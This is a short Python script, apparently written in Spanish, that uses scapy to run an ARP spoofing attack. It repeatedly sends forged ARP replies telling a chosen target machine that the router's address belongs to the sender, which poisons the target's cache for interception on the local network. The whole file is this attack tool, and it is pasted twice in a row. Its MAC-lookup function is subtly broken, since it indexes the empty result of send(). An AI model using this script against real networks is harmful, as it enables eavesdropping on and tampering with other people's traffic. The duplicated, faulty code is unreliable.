from scapy.sendrecv import send
from scapy.layers.l2 import ARP, Ether
import time

def obtener_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether/arp
    resp = send(paquete, verbose=False)
    return resp[0][ARP].hwsrc

def arp_spoof(ip_objetivo, ip_router):
    mac_objetivo = obtener_mac(ip_objetivo)
    paquete = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_router)
    try:
        while True:
            send(paquete, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Deteniendo ARP spoofing")

if __name__ == "__main__":
    ip_objetivo = input("Introduce la dirección IP de la máquina objetivo: ")
    ip_router = input("Introduce la dirección IP del router: ")

    arp_spoof(ip_objetivo, ip_router)
from scapy.sendrecv import send
from scapy.layers.l2 import ARP, Ether
import time

def obtener_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether/arp
    resp = send(paquete, verbose=False)
    return resp[0][ARP].hwsrc

def arp_spoof(ip_objetivo, ip_router):
    mac_objetivo = obtener_mac(ip_objetivo)
    paquete = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_router)
    try:
        while True:
            send(paquete, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Deteniendo ARP spoofing")

if __name__ == "__main__":
    ip_objetivo = input("Introduce la dirección IP de la máquina objetivo: ")
    ip_router = input("Introduce la dirección IP del router: ")

    arp_spoof(ip_objetivo, ip_router)
